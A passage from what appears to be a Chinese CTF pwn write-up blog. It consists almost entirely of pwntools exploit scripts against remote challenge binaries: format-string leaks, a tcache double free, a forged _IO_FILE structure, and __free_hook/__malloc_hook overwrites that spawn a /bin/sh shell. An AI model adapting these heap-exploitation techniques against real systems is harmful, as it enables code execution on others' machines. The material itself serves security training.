class="number">-2</span>],<span class="number">16</span>)-(<span class="number">0x7f0a1bc1e260</span><span class="number">-0x7f0a1bb27000</span>)+<span class="number">0x45216</span></span><br><span class="line">    <span class="keyword">print</span> hex(s1)</span><br><span class="line">    p.sendafter(<span class="string">"To seek the truth of the world.\n"</span>,<span class="string">"\x00\x00\x00\x00"</span>*<span class="number">12</span>+<span class="string">"3#\x00\x00"</span>*<span class="number">2</span>+p64(s)+<span class="string">"a"</span>*<span class="number">8</span>+<span class="string">"\xdb\x0d"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"ID:"</span>,<span class="string">"/bin/sh\x00kirin"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"world.\n"</span>,<span class="string">"a"</span>*<span class="number">48</span>+<span class="string">"3#"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"man.\n"</span>,<span class="string">"%7$p"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">    s5=p.recvuntil(<span class="string">"Y"</span>)</span><br><span class="line">    s5=int(s5[:<span class="number">-9</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(s5+<span class="number">0x1234</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.sendafter(<span class="string">"?\n"</span>,<span class="string">"ff\x00\x00"</span>*<span class="number">12</span>+p32(s5+<span class="number">0x1234</span>))</span><br><span class="line">    p.sendafter(<span class="string">"debts.\n"</span>,<span class="string">"%12$p"</span>)</span><br><span class="line">    stack=int(p.recvuntil(<span class="string">"W"</span>)[:<span class="number">-2</span>],<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">print</span> hex(stack)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.sendafter(<span class="string">"To seek the truth of the world.\n"</span>,p64(stack*<span class="number">16</span><span class="number">-0x70</span>)+p64(s1)+<span class="string">"\x00\x00\x00\x00"</span>*<span class="number">8</span>+<span class="string">"3#\x00\x00"</span>*<span class="number">2</span>+p64(s)+p64(stack*<span class="number">16</span><span class="number">-0x70</span>)+<span class="string">"\x52\x0b"</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">     <span class="keyword">print</span> <span class="string">"kirin"</span></span><br></pre></td></tr></table></figure>
<h3 id="2-2"><a href="#2-2" class="headerlink" title="2"></a>2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">_IO_USE_OLD_IO_FILE = <span class="literal">False</span></span><br><span class="line">_BITS = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_u64</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"&lt;Q"</span>,data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_u32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"&lt;I"</span>,data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_u16</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">"&lt;H"</span>,data)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_u8</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> ord(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_usz</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> _BITS == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> _u32(data)</span><br><span class="line">    <span class="keyword">elif</span> _BITS == <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">return</span> _u64(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Invalid _BITS"</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_ua</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> _BITS == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> _u32(data)</span><br><span class="line">    <span class="keyword">elif</span> _BITS == <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">return</span> _u64(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Invalid _BITS"</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_p64</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;Q"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_p32</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_p16</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;H"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_p8</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> chr(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_psz</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> _BITS == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> _p32(data)</span><br><span class="line">    <span class="keyword">elif</span> _BITS == <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">return</span> _p64(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Invalid _BITS"</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_pa</span><span class="params">(data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> _BITS == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>, data)</span><br><span class="line">    <span class="keyword">elif</span> _BITS == <span class="number">64</span>:</span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">"&lt;Q"</span>, data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] Invalid _BITS"</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_IO_FILE_plus</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._flags = <span class="number">0x00000000fbad2887</span>         <span class="comment"># High-order word is _IO_MAGIC; rest is flags.</span></span><br><span class="line">        self._IO_read_ptr = <span class="number">0x602500</span>   <span class="comment"># Current read pointer</span></span><br><span class="line">        self._IO_read_end = <span class="number">0x602500</span>   <span class="comment"># End of get area</span></span><br><span class="line">        self._IO_read_base = <span class="number">0x602500</span>  <span class="comment"># Start of putback+get area</span></span><br><span class="line">        self._IO_write_base = <span class="number">0x602600</span> <span class="comment"># Start of put area</span></span><br><span class="line">        self._IO_write_ptr = <span class="number">0x602600</span>  <span class="comment"># Current put pointer</span></span><br><span class="line">        self._IO_write_end = <span class="number">0x602600</span>  <span class="comment"># End of put area</span></span><br><span class="line">        self._IO_buf_base = <span class="number">0x602600</span>   <span class="comment"># Start of reserve area</span></span><br><span class="line">        self._IO_buf_end = <span class="number">0x602601</span>    <span class="comment"># End of reserve area</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># The following fields are used to support backing up and undo.</span></span><br><span class="line">        self._IO_save_base = <span class="number">0</span>      <span class="comment"># Pointer to start of non-current get area</span></span><br><span class="line">        self._IO_backup_base = <span class="number">0</span>    <span class="comment"># Pointer to first valid character of backup area</span></span><br><span class="line">        self._IO_save_end = <span class="number">0</span>       <span class="comment"># Pointer to end of non-current get area</span></span><br><span class="line"></span><br><span class="line">        self._markers = <span class="number">0</span></span><br><span class="line">        self._chain = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        self._fileno = <span class="number">0</span></span><br><span class="line">        self._flags2 = <span class="number">0</span></span><br><span class="line">        self._old_offset = <span class="number">0</span>    <span class="comment"># This used to be _offset but it's too small</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1+column number of pbase(); 0 is unknown</span></span><br><span class="line">        self._cur_column = <span class="number">0</span></span><br><span class="line">        self._vtable_offset = <span class="number">0</span></span><br><span class="line">        self._shortbuf = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        self._lock = <span class="number">0x602700</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> _IO_USE_OLD_IO_FILE:</span><br><span class="line">            self._offset = <span class="number">0</span></span><br><span class="line">            self._codecvt = <span class="number">0</span></span><br><span class="line">            self._wide_data = <span class="number">0</span></span><br><span class="line">            self._freeres_list = <span class="number">0</span></span><br><span class="line">            self._freeres_buf = <span class="number">0</span></span><br><span class="line">            self.__pad5 = <span class="number">0</span></span><br><span class="line">            self._mode = <span class="number">0</span></span><br><span class="line">            self._unused2 = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span> * <span class="number">4</span> - <span class="number">5</span> * _BITS / <span class="number">8</span>)]</span><br><span class="line">        self.vtable = heap_addr+<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">tostr</span><span class="params">(self)</span>:</span></span><br><span class="line">        buf = _p64(self._flags &amp; <span class="number">0xffffffff</span>) + \</span><br><span class="line">            _pa(self._IO_read_ptr) + \</span><br><span class="line">            _pa(self._IO_read_end) + \</span><br><span class="line">            _pa(self._IO_read_base) + \</span><br><span class="line">            _pa(self._IO_write_base) + \</span><br><span class="line">            _pa(self._IO_write_ptr) + \</span><br><span class="line">            _pa(self._IO_write_end) + \</span><br><span class="line">            _pa(self._IO_buf_base) + \</span><br><span class="line">            _pa(self._IO_buf_end) + \</span><br><span class="line">            _pa(self._IO_save_base) + \</span><br><span class="line">            _pa(self._IO_backup_base) + \</span><br><span class="line">            _pa(self._IO_save_end) + \</span><br><span class="line">            _pa(self._markers) + \</span><br><span class="line">            _pa(self._chain) + \</span><br><span class="line">            _p32(self._fileno) + \</span><br><span class="line">            _p32(self._flags2) + \</span><br><span class="line">            _p64(self._old_offset) + \</span><br><span class="line">            _p16(self._cur_column) + \</span><br><span class="line">            _p8(self._vtable_offset) + \</span><br><span class="line">            _p8(self._shortbuf)</span><br><span class="line">        <span class="keyword">if</span> _BITS == <span class="number">64</span>:</span><br><span class="line">            buf += _p32(<span class="number">0</span>)</span><br><span class="line">        buf += _pa(self._lock)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> _IO_USE_OLD_IO_FILE:</span><br><span class="line">            buf += \</span><br><span class="line">            _p64(self._offset) + \</span><br><span class="line">            _pa(self._codecvt) + \</span><br><span class="line">            _pa(self._wide_data) + \</span><br><span class="line">            _pa(self._freeres_list) + \</span><br><span class="line">            _pa(self._freeres_buf) + \</span><br><span class="line">            _psz(self.__pad5) + \</span><br><span class="line">            _p32(self._mode) + \</span><br><span class="line">            <span class="string">''</span>.join(map(<span class="keyword">lambda</span> x:_p8(x), self._unused2)) +\</span><br><span class="line">            _pa(self.vtable)</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.tostr()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,note)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"1"</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">     p.sendafter(<span class="string">":"</span>,note)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,note)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"4"</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">     p.sendafter(<span class="string">":"</span>,note)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"3"</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">     <span class="keyword">return</span> p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p=process("./namebook")</span></span><br><span class="line">p=remote(<span class="string">"118.24.3.214"</span>,<span class="number">12344</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">17</span>+p64(<span class="number">0x121</span>)+<span class="string">"\n"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line">libc_addr=u64(show(<span class="number">2</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x4b78</span><span class="number">-0x3c000</span><span class="number">-0x384000</span></span><br><span class="line">free_hook=libc_addr+<span class="number">0x3c67a8</span></span><br><span class="line">system_addr=libc_addr+<span class="number">0xf1147</span></span><br><span class="line">add(<span class="number">6</span>,<span class="string">"kirin\n"</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">heap_addr=u64(show(<span class="number">2</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span>  hex(heap_addr)</span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">add(<span class="number">7</span>,p64(system_addr)*<span class="number">16</span>)</span><br><span class="line">s = _IO_FILE_plus().tostr()</span><br><span class="line"><span class="keyword">print</span> len(s)</span><br><span class="line">edit(<span class="number">-4</span>,s)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="3-2"><a href="#3-2" class="headerlink" title="3"></a>3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(note)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"1"</span>)</span><br><span class="line">     p.sendafter(<span class="string">":"</span>,note)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,note)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">     p.sendafter(<span class="string">":"</span>,note)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"3"</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">     p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">     <span class="keyword">return</span> p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line"><span class="comment">#p=process("./CSTW_3")</span></span><br><span class="line">p=remote(<span class="string">"118.24.3.214"</span>,<span class="number">12342</span>)</span><br><span class="line">p.sendline(<span class="string">"\n\n\n"</span>)</span><br><span class="line">add(p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="string">"kirin"</span>)</span><br><span class="line">add(p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>))</span><br><span class="line">add(<span class="string">"kirin"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="string">"\x11"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">heap_addr=u64(delete(<span class="number">0</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x11</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_addr+<span class="number">0x70</span>))</span><br><span class="line">add(<span class="string">"kirin"</span>)</span><br><span class="line">add(p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))</span><br><span class="line">libc_addr=u64(delete(<span class="number">1</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))<span class="number">-0x3c4b78</span></span><br><span class="line">malloc_hook=libc_addr+<span class="number">0x03c4b10</span></span><br><span class="line">system_addr=libc_addr+<span class="number">0x45390</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">edit(<span class="number">1</span>,p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">add(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">add(<span class="string">"a"</span>*<span class="number">0x13</span>+p64(libc_addr+<span class="number">0x4526a</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="4-2"><a href="#4-2" class="headerlink" title="4"></a>4</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(note)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"1"</span>)</span><br><span class="line">     p.sendafter(<span class="string">":"</span>,note)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"3"</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">     <span class="keyword">return</span> p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">     p.sendlineafter(<span class="string">"&gt;"</span>,<span class="string">"2"</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span class="line"><span class="comment">#p=process("./babytcache")</span></span><br><span class="line">p=remote(<span class="string">"118.24.3.214"</span>,<span class="number">12341</span>)</span><br><span class="line">add(<span class="string">"kirin\n"</span>)</span><br><span class="line">add(<span class="string">"kirin\n"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">heap_addr=u64(show(<span class="number">0</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line">add(p64(<span class="number">0x6020e0</span>)+<span class="string">"\n"</span>)</span><br><span class="line">add(<span class="string">"kirin\n"</span>)</span><br><span class="line">add(p64(<span class="number">0x6020a0</span>)+<span class="string">"\n"</span>)</span><br><span class="line">libc_addr=u64(show(<span class="number">0</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">system_addr=libc_addr+<span class="number">0x004f440</span><span class="number">-0x3ec760</span></span><br><span class="line">free_hook=libc_addr<span class="number">-0x3ec760</span>+<span class="number">0x000003ed8e8</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(p64(free_hook)+<span class="string">"\n"</span>)</span><br><span class="line">add(<span class="string">"/bin/sh\x00\n"</span>)</span><br><span class="line">add(p64(system_addr)+<span class="string">"\n"</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="week-4"><a href="#week-4" class="headerlink" title="week 4"></a>week 4</h2><h3 id="1-3"><a href="#1-3" class="headerlink" title="1"></a>1</h3><p><strong>模改pwnable.tw的题目3x17,其实这题的可实现方案我在3x17的Writeup里就已经提到过(方案三)，只是当时没去写EXP，现已更新：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;kirin-say.top&#x2F;2019&#x2F;02&#x2F;08&#x2F;pwnable-tw-3x17&#x2F;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">"debug"</span></span><br><span 